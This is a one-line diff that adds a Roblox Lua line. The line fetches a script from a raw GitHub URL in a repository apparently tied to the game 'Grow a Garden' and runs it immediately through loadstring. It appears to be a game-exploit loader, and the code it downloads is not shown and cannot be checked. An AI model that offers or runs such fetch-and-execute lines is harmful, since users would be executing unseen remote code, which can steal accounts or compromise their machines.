@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ysaas443-web/GROW-A-GARDEN/refs/heads/main/azm%20Rio%20mere%20wa"))()
